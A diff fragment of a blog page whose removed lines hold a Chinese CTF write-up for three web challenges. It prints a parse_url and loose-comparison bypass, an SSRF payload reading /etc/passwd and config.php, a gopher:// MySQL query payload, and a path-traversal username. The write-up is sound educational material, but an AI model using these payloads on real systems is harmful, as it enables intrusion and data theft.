-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>首发于安全客 <a href="https://www.anquanke.com/post/id/153258">https://www.anquanke.com/post/id/153258</a></p>
-</blockquote>
-<p></p><p>28号的时候师傅们都在打real world ctf，看了一下real world ctf实在玩不动。。。于是就去玩了玩这个越南的ctf比赛的web部分的题目。整体而言这个比赛的web部分的题目偏中等难度，还是比较适合新手的一次练手，部分题目也有一定的新意。这里给出部分题目的writeup。</p><p></p>
-<p></p><p> </p><p></p>
-<p></p><h2 name="h2-0" id="h2-0">IZ</h2><p></p>
-<p><blockquote><p><a href="http://35.185.178.212/">题目地址</a></p></blockquote></p>
-<p></p><p>打开题目可以获得题目源码：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> “config.php”;</span><br><span class="line">$number1 = rand(<span class="number">1</span>,<span class="number">100000000000000</span>);</span><br><span class="line">$number2 = rand(<span class="number">1</span>,<span class="number">100000000000</span>);</span><br><span class="line">$number3 = rand(<span class="number">1</span>,<span class="number">100000000</span>);</span><br><span class="line">$url = urldecode($_SERVER[‘REQUEST_URI’]);</span><br><span class="line">$url = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/_/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/<span class="number">0</span>/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(“/w+/i”, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“…”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($GET[‘‘]) &amp;&amp; !<span class="keyword">empty</span>($GET[‘‘]))</span><br><span class="line">&#123;</span><br><span class="line">$control = $GET[‘‘];</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail1”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number2)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail2”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!in_array($control, <span class="keyword">array</span>(<span class="number">0</span>,$number3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(“fail3”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
-<p></p><p>可以看到题目的逻辑主要是获取query_string后用parse_url处理，处理后的$url再进行过滤，可以看到这里的过滤非常严所以想要绕过过滤还是有一定难度的。<br><br>然而parse_url函数存在一个bug:<br><br>当url的格式为<code>http:/localhost///x.php?key=value</code>的方式可以使其返回<code>False</code><br><br>这样就可以成功绕过之后的三次preg_match的过滤.<br><br>绕过三次preg_match的过滤后程序又进行了三次in_array()判断，而三次in_array()的数组都存在0这样一个元素。而由php弱类型的特性，in_array()在判断时使用的是弱比较，当比较一个字符串和一个数字时默认会尝试把字符串转换为数字，如果字符串的第一个字符不是数字的话则该字符串会被转化成0.具体的转化规则可以参考<a href="http://php.net/manual/zh/language.operators.comparison.php">php.net中的描述</a>。<br><br>因此最终的payload为：</p><p></p>
-<p><pre><code>///?_=a<br></code></pre></p>
-<p></p><p>访问即可获取flag。</p><p></p>
-<p></p><p> </p><p></p>
-<p></p><h2 name="h2-1" id="h2-1">Friss</h2><p></p>
-<p><blockquote><p><a href="http://35.190.142.60/">题目地址</a></p></blockquote></p>
-<p></p><p>题目进去后是一个表单页面：<br><img class="aligncenter" title="curl1" alt="curl1" src="https://p0.ssl.qhimg.com/t0156be5a0c256cebbc.png"></p><p></p>
-<p></p><p>可以判断这个题目应该是要考ssrf相关的东西。于是首先测试file协议看能不能读到文件，输入<code>file:///etc/passwd</code>，结果题目返回：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> “config.php”;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[‘url’])&amp;&amp;!<span class="keyword">empty</span>($_POST[‘url’]))</span><br><span class="line">&#123;</span><br><span class="line">    $url = $_POST[‘url’];</span><br><span class="line">    $content_url = getUrlContent($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $content_url = “”;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[‘debug’]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(FILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
-<p></p><p><code>file://localhost/var/www/html/config.php</code></p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$hosts = “localhost”;</span><br><span class="line">$dbusername = “ssrf_user”;</span><br><span class="line">$dbpasswd = “”;</span><br><span class="line">$dbname = “ssrf”;</span><br><span class="line">$dbport = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$dbinit = “create table <span class="keyword">if</span> not exists flag(secret varchar(<span class="number">100</span>));”;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span>($tmpurl != “localhost” <span class="keyword">and</span> $tmpurl != “<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>”)</span><br><span class="line">&#123;</span><br><span class="line">var_dump($tmpurl);</span><br><span class="line"><span class="keyword">die</span>(“&lt;h1&gt;Only access to localhost&lt;/h1&gt;”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$url = safe($url);</span><br><span class="line">$url = escapeshellarg($url);</span><br><span class="line">$pl = “curl “.$url;</span><br><span class="line"><span class="keyword">echo</span> $pl;</span><br><span class="line">$content = shell_exec($pl);</span><br><span class="line"><span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
-<p></p><p>可以看到在config.php中告诉我们flag在数据库中且给出了我们一个空密码的mysql账户。因此我们便可以联想到34c3ctf中的一道<a href="http://www.freebuf.com/articles/web/159342.html">使用gopher协议攻击mysql的题目</a>。</p><p></p>
-<p></p><p>这里gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。<br><br>因此我们可以在本地用mysql搭建同样的环境，使用mysql客户端进行一次连接并获取执行读取flag的操作，用wireshark抓包后将抓取到的数据urlencode之后构造成符合gopher结构的payload即可获取到最后的flag。<br><br>首先我们创建相同的用户和同样的表结构：<img class="aligncenter" title="database" alt="database" src="https://p3.ssl.qhimg.com/t013058e72ceef9e2ac.png">然后给该用户此数据库的权限后使用该用户登入，获取该数据库内的flag信息，同时使用wireshark抓取lo上的包:<br><img class="aligncenter" alt="" src="https://p2.ssl.qhimg.com/t015c3a4af5175d3803.png"><br><img class="aligncenter" alt="" src="https://p4.ssl.qhimg.com/t015505823f6c7c57ab.png">wireshark中我们设置只显示客户端发送的数据包，以原始数据的形式显示<br><img class="aligncenter" alt="" src="https://p3.ssl.qhimg.com/t011d0763eeb24df413.png">将数据复制下来转换成urlencode的形式，构造gopher的链接为：</p><p></p>
-<p><pre><code>gopher://127.0.0.1:3306/_%A8%00%00%01%85%A6%FF%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00mysql_native_password%00f%03_os%05Linux%0C_client_name%08libmysql%04_pid%0519500%0F_client_version%065.7.22%09_platform%06x86_64%0Cprogram_name%05mysql%21%00%00%00%03select%20%40%40version_comment%20limit%201%12%00%00%00%03SELECT%20DATABASE%28%29%05%00%00%00%02ssrf%0F%00%00%00%03show%20databases%0C%00%00%00%03show%20tables%06%00%00%00%04flag%00%13%00%00%00%03select%20%2A%20from%20flag%01%00%00%00%01<br></code></pre></p>
-<p></p><p>最后可以在回显中获取flag<br><img class="aligncenter" alt="" src="https://p5.ssl.qhimg.com/t019c4894b8888e1928.png"></p><p></p>
-<p></p><p> </p><p></p>
-<p></p><h2 name="h2-2" id="h2-2">NNService</h2><p></p>
-<p><blockquote><p><a href="http://35.240.231.243/">题目地址</a></p></blockquote></p>
-<p></p><p>先扫描查看是否存在源码泄露，发现存在robots.txt,提示存在源码bk/bk.zip,访问即可获取题目的源码。<br><br>这里我们主要分析题目最后导致getflag的两个点，在<code>index.controller.php</code>中,首先分析更改个人信息的位置上传头像的点:</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_FILES[‘avatar’] <span class="keyword">and</span> $_FILES[“avatar”][“error”] == <span class="number">0</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span>((($_FILES[“avatar”][“type”] == “image/gif”) <span class="keyword">or</span> ($_FILES[“avatar”][“type”] == “image/jpeg”) <span class="keyword">or</span> ($_FILES[“avatar”][“type”] == “image/png”)) <span class="keyword">and</span> $_FILES[‘avatar’][‘size’]&lt;<span class="number">65535</span>)&#123;</span><br><span class="line">         $info=getimagesize($_FILES[‘avatar’][‘tmp_name’]);</span><br><span class="line">         <span class="keyword">if</span>(@is_array($info) <span class="keyword">and</span> array_key_exists(‘mime’,$info))&#123;</span><br><span class="line">             $type=explode(‘/‘,$info[‘mime’])[<span class="number">1</span>];</span><br><span class="line">             $filepath=<span class="keyword">$this</span>-&gt;user-&gt;getuser().”.”.$type;</span><br><span class="line">             $filename=”uploads/“.$filepath;</span><br><span class="line">             <span class="keyword">if</span>(is_uploaded_file($_FILES[‘avatar’][‘tmp_name’]))&#123;</span><br><span class="line">                 <span class="keyword">$this</span>-&gt;user-&gt;edit(“avatar”,<span class="keyword">array</span>($filepath,$type));</span><br><span class="line">                 <span class="keyword">if</span>(strpos($filepath,”..”) !== <span class="keyword">false</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">die</span>(“Hacker, cut please!”);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span> <span class="keyword">if</span>(move_uploaded_file($_FILES[‘avatar’][‘tmp_name’], $filename))&#123;</span><br><span class="line">                     quit_and_refresh(‘Upload success!’,’edit’);</span><br><span class="line">                 &#125;</span><br><span class="line">                 quit_and_refresh(‘Success!’,’edit’);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">//TODO！report it！</span></span><br><span class="line">             quit(‘Only allow gif/jpeg/png files smaller than <span class="number">64</span>kb!’);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="comment">//TODO！report it！</span></span><br><span class="line">         quit(‘Only allow gif/jpeg/png files smaller than <span class="number">64</span>kb!’);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p></p>
-<p></p><p>分析代码流程，首先判断图片的mime类型，然后使用getimagesize获取图片的信息，之后从getimagesize获取到的图片信息中获取图片的后缀名，之后可以看到<code>$filepath=$this-&gt;user-&gt;getuser().”.”.$type;</code>，将用户名与图片名称拼接为图片上传路径，后调用<code>$this-&gt;user-&gt;edit(“avatar”,array($filepath,$type));</code>,跟到<code>user.class.php</code>文件中可以发现这一步的操作实质是将文件名写入了数据库中。之后<strong>使用强等于</strong>判断文件名中是否含有<code>..</code>，如果含有<code>..</code>则终止整个流程，否则将移动上传的图片到upload文件夹下，命名为<code>用户名.文件类型</code>;<br><br>然后我们再分析export处的源码：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">export</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $avatar=<span class="keyword">$this</span>-&gt;user-&gt;getavatar();</span><br><span class="line">        <span class="keyword">if</span>(substr($avatar,<span class="number">0</span>,<span class="number">5</span>)!==”data:”)&#123;</span><br><span class="line">            $fileavatar=substr(<span class="keyword">$this</span>-&gt;user-&gt;getavatar(),<span class="number">1</span>);</span><br><span class="line">            $avatar = “uploads/“.$fileavatar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_exists($avatar) <span class="keyword">and</span> filesize($avatar)&amp;lt;<span class="number">65535</span> <span class="keyword">and</span> strpos($fileavatar,<span class="string">".."</span>)==<span class="keyword">false</span>)&#123;</span><br><span class="line">        $data=file_get_contents($avatar);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;updateavatar($data)) quit(<span class="string">'Something error!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//TODO！report it！</span></span><br><span class="line">        $out=<span class="string">"Your avatar is invalid, so we reported it"</span>.<span class="string">"&amp;lt;/p&amp;gt;"</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"templates/error.html"</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;br&amp;gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$article=<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;getarticle();</span><br><span class="line">$data=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&amp;lt;count($article);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($i!=count($article)<span class="number">-1</span>)&#123;</span><br><span class="line">        $data.=$article[$i][<span class="number">2</span>].<span class="string">"rn"</span>;</span><br><span class="line">        $data.=$article[$i][<span class="number">3</span>].<span class="string">"n"</span>;</span><br><span class="line">        $data.=<span class="string">"----------n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $data.=$article[$i][<span class="number">2</span>].<span class="string">"rn"</span>;</span><br><span class="line">        $data.=$article[$i][<span class="number">3</span>].<span class="string">"n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data.=<span class="string">"==========n"</span>;</span><br><span class="line">$avatar=<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;getavatar(<span class="number">1</span>);</span><br><span class="line">$data.=base64_encode($avatar[<span class="number">1</span>]).<span class="string">"n"</span>;</span><br><span class="line">$data.=$avatar[<span class="number">3</span>];</span><br><span class="line">header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">header(<span class="string">"Content-Transfer-Encoding: binary"</span>);</span><br><span class="line">header(<span class="string">"Accept-Ranges: bytes"</span>);</span><br><span class="line">header(<span class="string">"Content-Length: "</span>.strlen($data));</span><br><span class="line">header(<span class="string">"Content-Disposition: attachment; filename="</span><span class="string">".$this-&amp;gt;user-&amp;gt;getuser()."</span><span class="string">""</span>);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p>
-<p></p><p>可以看到export处的代码在进行导出时，首先调用<code>$avatar=$this-&gt;user-&gt;getavatar();</code>获取头像的信息，我们跟到<code>user.class.php</code>中可以发现这一步操作便是将我们之前写入数据库的文件名取出。然后这里的代码对文件进行判断，判断文件是否存在，文件大小是否小于65535，以及<strong>使用弱等于</strong>判断文件名中是否含有<code>..</code>。之后便获取文件内容并base64加密后拼接上之前的一些信息输出文件。<br><br>这里我们可以看到主要的漏洞点在于写入数据库的操作在判断文件名是否包含<code>..</code>之前，因此我们即使文件名中包含了<code>..</code>最后不合法的文件名也会被写入数据库。而在之后export处读取到文件名后使用的是弱等于判断：</p><p></p>
-<p><pre><code class="lang-php">strpos($fileavatar,”..”)==false<br></code></pre></p>
-<p></p><p>然而当我们构造类似<code>../flag.php</code>的字符串时，strpos返回<code>..</code>出现的位置0，而<code>0==false</code>成立。因此我们便可以成功实现目录穿越。<br><br>但是这里还有一点：我们的文件名的生成方式是<code>用户名.文件类型</code>,文件类型由getimagesize()函数获得，因此只能是图片文件的后缀名，那么怎样才能截断这个后缀名从而成功获取<code>flag.php</code>的源码？<br><br>这里我们查看之前下载到的源码中的sql文件:</p><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">users</span> (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">  username <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">  nickname <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">  <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</span><br><span class="line">  email <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> articles (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">user_id <span class="built_in">int</span>(<span class="number">32</span>),</span><br><span class="line">title <span class="built_in">varchar</span>(<span class="number">100</span>),</span><br><span class="line"><span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">500</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> avatar (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line"><span class="keyword">data</span> <span class="built_in">blob</span>,</span><br><span class="line">user_id <span class="built_in">int</span>(<span class="number">32</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">filepath <span class="built_in">varchar</span>(<span class="number">100</span>),</span><br><span class="line">photo_type <span class="built_in">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p></p>
-<p></p><p>可以看到这里的sql文件中限制了图片路径<code>filepath</code>字段的长度最多为100，用户名<code>username</code>的长度也最多为100。这里便可以联想到mysql的一个性质：<code>当mysql开启宽松模式时，在INSERT的时候，如果你插入的字符超出了MySQL的字段长度，MySQL会自动截断到最大长度然后插入，并不会出错。</code>，具体可以参考这篇文章：<a href="http://www.91ri.org/5963.html">http://www.91ri.org/5963.html</a><br><br>因此我们如果注册长度为100的用户名，在将文件名写入数据库时，用户名之后拼接的后缀便会被截断从而无法进入数据库，因此便实现了我们对文件的控制。<br><br>最后解题的方法为：</p><p></p>
-<ul><br><li>注册用户名：<code>..//////////////////////////////////////////////////////////////////////////////////////////flag.php</code><br></li><br><li>edit处随意上传一张图片</li><br><li>export处导出数据，便可获得flag。</li><br></ul><br><p> </p><br><h2 name="h2-3" id="h2-3">总结</h2><br><p>这场比赛整体难度适中，比较适合新手用于提高自己的水平。此外比赛源码已经上传到<a href="https://github.com/susers/Writeups">https://github.com/susers/Writeups</a>上，欢迎大家star与pull request！</p><br><p> </p><br><h2 name="h2-4" id="h2-4">参考资料</h2><br><ul><br><li><a href="http://php.net/manual/zh/language.operators.comparison.php">http://php.net/manual/zh/language.operators.comparison.php</a></li><br><li><a href="http://www.freebuf.com/articles/web/159342.html">http://www.freebuf.com/articles/web/159342.html</a></li><br><li><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></li><br><li><a href="http://www.91ri.org/5963.html">http://www.91ri.org/5963.html</a></li><br></ul>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2430,7 +2421,7 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">57</span>
+                    <span class="site-state-item-count">58</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2473,7 +2464,9 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                     
                       
                     
-                    <span class="site-state-item-count">15</span>
+                      
+                    
+                    <span class="site-state-item-count">16</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -2508,7 +2501,9 @@ linker_and_loader->end</textarea><textarea id="flowchart-0-options" style="displ
                     
                       
                     
-                    <span class="site-state-item-count">11</span>
+                      
+                    
+                    <span class="site-state-item-count">12</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
